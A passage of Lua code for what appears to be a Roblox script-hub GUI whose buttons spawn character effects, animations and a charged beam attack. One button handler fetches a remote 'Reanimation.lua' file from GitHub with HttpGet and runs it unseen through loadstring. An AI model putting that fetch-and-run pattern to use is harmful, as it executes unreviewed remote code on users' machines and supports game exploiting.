			end
			while r < 16 and charging == true do
				r = r + .1
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.3)
				blass = Instance.new("Part",RightArm)
				blass.Size = Vector3.new(r,r,r)
				blass.Material = "Neon"
				blass.CFrame = rightlocation.CFrame * CFrame.new(0,-r/1.5,0) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
				blass.Anchored = true
				blass.CanCollide = false
				blass.BrickColor = BrickColor.new(colors)
				removeuseless:AddItem(blass,2)
				swait()
			end
			local TheBeam = Instance.new("Part",RightArm)
			TheBeam.Name = "zebeam"
			TheBeam.Size = Vector3.new(1,1,1)
			TheBeam.Material = "Neon"
			TheBeam.Shape = "Cylinder"
			TheBeam.BrickColor = BrickColor.new("Really red")
			TheBeam.Anchored = true
			TheBeam.CanCollide = false
			ws = 12
			bemmo = Instance.new("Sound",RightArm)
			bemmo.SoundId = "rbxassetid://1910988873"
			bemmo.Volume = 8
			bemmo.Looped = false
			bemmo:Play()
			bemmo.TimePosition = 2
			for i = 1, 100 * r/3 do
				if r > 15 then
					hum.CameraOffset = Vector3.new(math.random(-1,1),math.random(-1,1),math.random(-0,0))
				end
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.3)
				local blass = Instance.new("Part",RightArm)
				blass.Size = Vector3.new(r,r,r)
				blass.Material = "Neon"
				blass.CFrame = rightlocation.CFrame * CFrame.new(0,-r/1.5,0) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
				blass.Anchored = true
				blass.CanCollide = false
				blass.BrickColor = BrickColor.new(colors)
				removeuseless:AddItem(blass,2)
				local STARTPOS = blass.CFrame*CFrame.new(0,0,0).p
				local ENDHIT,ENDPOS = ray2(STARTPOS,mouse.Hit.p,650,Character)
				local DISTANCE = (STARTPOS - ENDPOS).magnitude
				TheBeam.CFrame = CFrame.new(STARTPOS,ENDPOS)*CFrame.new(0,0,-DISTANCE/2) * CFrame.Angles(math.rad(0),math.rad(90),math.rad(0))
				TheBeam.Size = Vector3.new(DISTANCE,r/math.random(1,2),r/math.random(1,2))
				boom = Instance.new("Part",RightArm)
				boom.Size = Vector3.new(r,r,r)
				boom.BrickColor = BrickColor.new(colors)
				boom.Anchored = true
				boom.CanCollide = false
				boom.Material = "Neon"
				boom.CFrame = CFrame.new(ENDPOS) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
				removeuseless:AddItem(boom,3)
				boom.Touched:connect(function(getbase)
					if hitdebounce then return end
					hitdebounce = true
					if getbase:IsA("Part") then
						damagedground = Instance.new("Part",RightArm)
						damagedground.Size = Vector3.new(.1,5+r,.1)
						damagedground.Material = "Neon"
						damagedground.CanCollide = false
						damagedground.BrickColor = BrickColor.new(colors)
						damagedground.Anchored = true
						damagedground.CFrame = boom.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
						removeuseless:AddItem(damagedground,2)
						wait(.1)
						hitdebounce = false
					end
				end)
				Hit = damagealll(r+3,boom.Position)
				for _,v in pairs(Hit) do	
					v:FindFirstChildOfClass("Humanoid"):TakeDamage(0)
					vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
					vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
					torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
					vel.velocity = CFrame.new(boom.Position,torso.Position).lookVector*r
					removeuseless:AddItem(vel,.1)
				end
				swait()
			end
			removeuseless:AddItem(g1,.001)
			coroutine.wrap(function()
				for i = 1, 20 do
					bemmo.Volume = bemmo.Volume - 0.5
					blass.Transparency = blass.Transparency + 0.05
					TheBeam.Transparency = TheBeam.Transparency + 0.05
					swait()
				end
				bemmo:Remove()
				if r > 15 then
					hum.CameraOffset = Vector3.new(0,0,0)
				end
				blass:Remove()
				TheBeam:Remove()
			end)()
			ws = 50
			appi = false
			attacking = false
			debounce = false
		end
	end)

	mouse.KeyUp:connect(function(Press)
		Press=Press:lower()
		if Press=='j' then
			charging = false
		end
	end)

	mouse.KeyUp:connect(function(Press)
		Press=Press:lower()
		if Press=='k' then
			charging = false
		end
	end)

	doit = coroutine.wrap(function()
		while true do
			for _,v in pairs(Repeater) do
				v.Scale =  v.Scale + Vector3.new(1, 1, 1)
			end

			for _,v in pairs(openshocktable) do
				v.Scale =  v.Scale + Vector3.new(3, 3, 3)
			end

			for _,v in pairs(nonmeshRepeater) do
				v.Size =  v.Size + Vector3.new(2, 2, 2)
			end

			for _,v in pairs(Extreme) do
				v.Size =  v.Size + Vector3.new(6, 6, 6)
			end

			for _,v in pairs(LessSize) do
				v.Size = v.Size - Vector3.new(1, 1, 1)
			end

			for _,v in pairs(nonmeshRepeater2) do
				v.Transparency = v.Transparency + 0.05
			end

			for _,v in pairs(Repeater2) do
				v.Transparency = v.Transparency - 0.05
			end

			for _,v in pairs(th1) do
				v.CFrame = v.CFrame * CFrame.new(0,0+.3,0) * CFrame.Angles(0,math.rad(0+8),0)
			end

			for _,v in pairs(th2) do
				v.CFrame = v.CFrame * CFrame.new(0,0,0) * CFrame.Angles(0,math.rad(0+15),0)
			end

			for _,v in pairs(th3) do
				v.Scale = v.Scale + Vector3.new(2, 2, 2)
			end

			for _,v in pairs(th5) do
				v.Scale = v.Scale + Vector3.new(1, .1, 1)
			end

			for _,v in pairs(ExtremeM) do
				v.Size = v.Size + Vector3.new(8, 8, 8)
			end

			for _,v in pairs(m3) do
				v.Scale = v.Scale + Vector3.new(.2,.2,.2)
			end

			for _,v in pairs(ExtremeM2) do
				v.Size = v.Size - Vector3.new(2,2,2)
			end

			for _,v in pairs(keyYsize) do
				v.Scale = v.Scale + Vector3.new(8, 8, 1)
			end

			for _,v in pairs(th4) do
				v.Transparency = v.Transparency + 0.009
				v.Rotation = v.Rotation + Vector3.new(3,0,0)
			end

			for _,v in pairs(SlowlyFade) do
				v.Transparency = v.Transparency + 0.05
			end

			for _,v in pairs(keyYtransparency) do
				v.Transparency = v.Transparency + 0.05
			end

			for _,v in pairs(UpMover) do
				v.Position = v.Position + Vector3.new(0, 3, 0)
			end

			for _,v in pairs(ForwardMover) do
				v.CFrame = v.CFrame * CFrame.new(0, 0, 2.4 +(i/.1)) * CFrame.Angles(0, 0, math.rad(0))
			end

			for _,v in pairs(FadeIn) do
				v.Transparency = v.Transparency - .05
			end

			for _,v in pairs(signtransparency) do
				v.TextTransparency = v.TextTransparency + 0.025
			end

			for _,v in pairs(signmover) do
				v.StudsOffset = v.StudsOffset + Vector3.new(math.random(-2,2),.3,math.random(-2,2))
			end

			for _,v in pairs(signrotator) do
				v.Rotation = v.Rotation + 2
			end
			swait()
		end
	end)
	doit()
	t = 0

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='0' then
			if levitate then return end
			shoov = true
			if debounce then return end
			ws = 50
		end
	end)

	mouse.KeyUp:connect(function(Press)
		Press=Press:lower()
		if Press=='0' then
			if levitate then return end
			shoov = false
			if debounce then return end
			ws = 10
		end
	end)


	local anims = coroutine.wrap(function()
		while true do
			settime = 0.05
			sine = sine + change
			if position == "Jump" and attacking == false then
				change = 1
				LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
				RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
				LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(-3),math.rad(-4)), 0.4)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(3),math.rad(4)), 0.4)
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
			elseif position == "Jump2" and attacking == false and levitate then
				change = 1
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-20 - 1 * math.sin(sine/9)), math.rad(0 + 0 * math.cos(sine/8)), math.rad(0) + Root.RotVelocity.Y / 30, math.cos(10 * math.cos(sine/10))), 0.3)
				LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
				RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.3)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - .1 * math.sin(sine/12)),math.rad(40 - .5 * math.sin(sine/12))), 0.3)
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + .1 * math.sin(sine/12)),math.rad(-40 + .5 * math.sin(sine/12))), 0.3)
				LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.3)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.54, 2.0 + .02 * math.sin(sine/9), 0.2 + .1 * math.sin(sine/9)) * CFrame.Angles(math.rad(25 + 5 * math.sin(sine/9)), math.rad(20), math.rad(0)), 0.3)
			elseif position == "Falling" and attacking == false and levitate == false then
				change = 1
				LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
				RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
				LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(20)), 0.2)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-20)), 0.2)
			elseif position == "Falling2" and attacking == false and levitate then
				change = 1
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-20 - 1 * math.sin(sine/9)), math.rad(0 + 0 * math.cos(sine/8)), math.rad(0) + Root.RotVelocity.Y / 30, math.cos(10 * math.cos(sine/10))), 0.3)
				LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
				RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.3)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - .1 * math.sin(sine/12)),math.rad(40 - .5 * math.sin(sine/12))), 0.3)
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + .1 * math.sin(sine/12)),math.rad(-40 + .5 * math.sin(sine/12))), 0.3)
				LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.3)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.54, 2.0 + .02 * math.sin(sine/9), 0.2 + .1 * math.sin(sine/9)) * CFrame.Angles(math.rad(25 + 5 * math.sin(sine/9)), math.rad(20), math.rad(0)), 0.3)
			elseif position == "Walking" and attacking == false and running == false then
				change = 1
				walking = true
				LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
				RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - .1 * math.sin(sine/12)),math.rad(40 - .5 * math.sin(sine/12))), 0.3)
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + .1 * math.sin(sine/12)),math.rad(-40 + .5 * math.sin(sine/12))), 0.3)
				LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-10), math.rad(5 * math.cos(sine/7)), math.rad(0) + Root.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/10))), 0.3)
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.cos(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + RightLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.cos(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + LeftLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
			elseif position == "Idle" and attacking == false and running == false and not levitate then
				change = .5
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.1)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.1)
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.1)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.1)
				LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.1)
				RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.1)
				LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.1)
			elseif position == "Idle2" and attacking == false and running == false then
				change = .75
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0 - 3 * math.sin(sine/9)),0,0),.1)
				RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
				LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(-.2,.2,0) * CFrame.Angles(0,0,0),.1)
				LEFTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
				RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.8 - .1 * math.sin(sine/9), 0) * CFrame.Angles(math.rad(0), math.rad(0 + 3 * math.sin(sine/9)), math.rad(35 - 5 * math.sin(sine/9))), 0.4)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.6, 0.8 - .1 * math.sin(sine/9), 0) * CFrame.Angles(math.rad(0), math.rad(0 - 3 * math.sin(sine/9)), math.rad(-35 + 5 * math.sin(sine/9))), 0.4)
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.4)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 2.0,0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10 + 2 * math.sin(sine/9))), 0.4)
			elseif position == "Walking2" and attacking == false and running == false then
				ws = 50
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-20 - 1 * math.sin(sine/9)), math.rad(0 + 0 * math.cos(sine/8)), math.rad(0) + Root.RotVelocity.Y / 30, math.cos(10 * math.cos(sine/10))), 0.3)
				LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
				RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.3)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - .1 * math.sin(sine/12)),math.rad(40 - .5 * math.sin(sine/12))), 0.3)
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + .1 * math.sin(sine/12)),math.rad(-40 + .5 * math.sin(sine/12))), 0.3)
				LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.3)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.54, 2.0 + .02 * math.sin(sine/9), 0.2 + .1 * math.sin(sine/9)) * CFrame.Angles(math.rad(25 + 5 * math.sin(sine/9)), math.rad(20), math.rad(0)), 0.3)
			elseif position == "Running" and attacking == false then
				change = 1
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(1.24+.6*math.sin(sine/4)/1.4, 0.54, 0+0.8*math.sin(sine/4)) * CFrame.Angles(math.rad(6-140*math.sin(sine/4)/1.2), math.rad(0), math.rad(-20+70*math.sin(sine/4))), 0.3)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(0, .5, 0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)), 0.3)
				LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(-1.24+.6*math.sin(sine/4)/1.4, 0.54, 0-0.8*math.sin(sine/4))*CFrame.Angles(math.rad(6+140*math.sin(sine/4)/1.2), math.rad(0), math.rad(20+70*math.sin(sine/4))), 0.3)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(0,.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),.3)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(-20 - 0 * math.sin(sine/4)), math.rad(0 + 6 * math.sin(sine/4)), math.rad(0) + Root.RotVelocity.Y / 30, math.sin(10 * math.sin(sine/4))), 0.3)
				RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,-.2 + .5*-math.sin(sine/4)),.3)
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.6+0.1*math.sin(sine/4),.7*-math.sin(sine/4)) * CFrame.Angles(math.rad(15+ -50 * math.sin(sine/4)),0,0),.3)
				LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,-.2 + .5*math.sin(sine/4)),.3)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.6-0.1*math.sin(sine/4),.7*math.sin(sine/4)) * CFrame.Angles(math.rad(15 + 50 * math.sin(sine/4)),0,0),.3)
			end
			swait()
		end
	end)
	anims()
	warn("Prepare for a magic trick full of pain and regret. Made by Supr14")
	
end)
--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "angle"
button.Position = UDim2.new(0.5,3,0,132)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "angle"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	-- Created by Nebula_Zorua --
	-- The Angel --
	-- A higher being.. Here to smite you evil-doers! --
	-- Discord: Nebula the Zorua#6969
	-- Youtube: https://www.youtube.com/channel/UCo9oU9dCw8jnuVLuy4_SATA
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Reanimation.lua"))()


	--// Initializing \\--
	local S = setmetatable({},{__index = function(s,i) return game:service(i) end})
	local Plrs = S.Players
	local Plr = Plrs.LocalPlayer
	local Char = game.Workspace.non
	local Hum = Char:FindFirstChildOfClass'Humanoid'
	local RArm = Char["Right Arm"]
	local LArm = Char["Left Arm"]
	local RLeg = Char["Right Leg"]
	local LLeg = Char["Left Leg"]	
	local Root = Char:FindFirstChild'HumanoidRootPart'
	local Torso = Char.Torso
	local Head = Char.Head
	local NeutralAnims = true
	local Attack = false
	local BloodPuddles = {}
	local Effects = {}
	local Debounces = {Debounces={}}
	local Mouse = Plr:GetMouse()
	local Hit = {}
	local Sine = 0
	local Change = 1
	local PulseTime = 0
	local DustTime = 0

	local Rooted = false
	--// Debounce System \\--

	function Debounces:New(name,cooldown)
		local aaaaa = {Usable=true,Cooldown=cooldown or 2,CoolingDown=false,LastUse=0}
		setmetatable(aaaaa,{__index = Debounces})
		Debounces.Debounces[name] = aaaaa
		return aaaaa
	end

	function Debounces:Use(overrideUsable)
		assert(self.Usable ~= nil and self.LastUse ~= nil and self.CoolingDown ~= nil,"Expected ':' not '.' calling member function Use")
		if(self.Usable or overrideUsable)then
			self.Usable = false
			self.CoolingDown = true
			local LastUse = time()
			self.LastUse = LastUse
			delay(self.Cooldown or 2,function()
				if(self.LastUse == LastUse)then
					self.CoolingDown = false
					self.Usable = true
				end
			end)
		end
	end

	function Debounces:Get(name)
		assert(typeof(name) == 'string',("bad argument #1 to 'get' (string expected, got %s)"):format(typeof(name) == nil and "no value" or typeof(name)))
		for i,v in next, Debounces.Debounces do
			if(i == name)then
				return v;
			end
		end
	end

	function Debounces:GetProgressPercentage()
		assert(self.Usable ~= nil and self.LastUse ~= nil and self.CoolingDown ~= nil,"Expected ':' not '.' calling member function Use")
		if(self.CoolingDown and not self.Usable)then
			return math.max(
				math.floor(
					(
						(time()-self.LastUse)/self.Cooldown or 2
					)*100
				)
			)
		else
			return 100
		end
	end

	--// Shortcut Variables \\--
	local CF = {N=CFrame.new,A=CFrame.Angles,fEA=CFrame.fromEulerAnglesXYZ}
	local C3 = {N=Color3.new,RGB=Color3.fromRGB,HSV=Color3.fromHSV,tHSV=Color3.toHSV}
	local V3 = {N=Vector3.new,FNI=Vector3.FromNormalId,A=Vector3.FromAxis}
	local M = {C=math.cos,R=math.rad,S=math.sin,P=math.pi,RNG = function(min,max,div) return math.random(min,max)/(div or 1) end,MRS=math.randomseed,H=math.huge,RRNG = function(min,max,div) return math.rad(math.random(min,max)/(div or 1)) end}
	local R3 = {N=Region3.new}
	local De = S.Debris
	local WS = workspace
	local Lght = S.Lighting
	local RepS = S.ReplicatedStorage
	local IN = Instance.new
	--// Instance Creation Functions \\--

	function Sound(parent,id,pitch,volume,looped,effect,autoPlay)
		local Sound = IN("Sound")
		Sound.SoundId = "rbxassetid://".. tostring(id or 0)
		Sound.Pitch = pitch or 1
		Sound.Volume = volume or 1
		Sound.Looped = looped or false
		if(autoPlay)then
			coroutine.wrap(function()
				repeat wait() until Sound.IsLoaded
				Sound.Playing = autoPlay or false
			end)()
		end
		if(not looped and effect)then
			Sound.Stopped:connect(function()
				Sound.Volume = 0
				Sound:destroy()
			end)
		elseif(effect)then
			warn("Sound can't be looped and a sound effect!")
		end
		Sound.Parent =parent or Torso
		return Sound
	end
	function Part(parent,color,material,size,cframe,anchored,cancollide)
		local part = IN("Part")
		part[typeof(color) == 'BrickColor' and 'BrickColor' or 'Color'] = color or C3.N(0,0,0)
		part.Material = material or Enum.Material.SmoothPlastic
		part.TopSurface,part.BottomSurface=10,10
		part.Size = size or V3.N(1,1,1)
		part.CFrame = cframe or CF.N(0,0,0)
		part.Anchored = anchored or true
		part.CanCollide = cancollide or false
		part.Parent = parent or Char
		return part
	end
	function Mesh(parent,meshtype,meshid,textid,scale,offset)
		local class = "SpecialMesh"
		if(meshtype == Enum.MeshType.Brick)then class = 'BlockMesh' end

		local part = IN(class)
		if(class == "SpecialMesh")then
			part.MeshId = meshid or ""
			part.TextureId = textid or ""
			part.MeshType = meshtype or Enum.MeshType.Sphere
		end
		part.Scale = scale or V3.N(1,1,1)
		part.Offset = offset or V3.N(0,0,0)

		part.Parent = parent
		return part
	end

	NewInstance = function(instance,parent,properties)
		local inst = Instance.new(instance,parent)
		if(properties)then
			for i,v in next, properties do
				pcall(function() inst[i] = v end)
			end
		end
		return inst;
	end



	--// Extended ROBLOX tables \\--
	local Instance = setmetatable({ClearChildrenOfClass = function(where,class,recursive) local children = (recursive and where:GetDescendants() or where:GetChildren()) for _,v in next, children do if(v:IsA(class))then v:destroy();end;end;end},{__index = Instance})
	--// Customization \\--

	local Frame_Speed = 75 -- The frame speed for swait. 1 is automatically divided by this
	local Remove_Hats = false
	local Remove_Clothing = false
	local PlayerSize = 1
	local DamageColor = BrickColor.new'New Yeller'
	local MusicID = 835120625

	--// Weapon and GUI creation, and Character Customization \\--

	if(Remove_Hats)then Instance.ClearChildrenOfClass(Char,"Accessory",true) end
	if(Remove_Clothing)then Instance.ClearChildrenOfClass(Char,"Clothing",true) Instance.ClearChildrenOfClass(Char,"ShirtGraphic",true) end
	Instance.ClearChildrenOfClass(Char,"Decal",true)
	local Effects = IN("Folder",Char)
	Effects.Name = "Effects"

	local Halo = IN("Model",Char)
	Halo.Name = "Halo"

	local Wings = IN("Model",Char)
	Wings.Name = "Wings"

	Hum.DisplayDistanceType = 'None'

	local naeeym2 = IN("BillboardGui",Char)
	naeeym2.AlwaysOnTop = true
	naeeym2.Size = UDim2.new(5,35,2,15)
	naeeym2.StudsOffset = V3.N(0,2.5,0)
	naeeym2.Adornee = Char.Head
	naeeym2.Name = "Name"
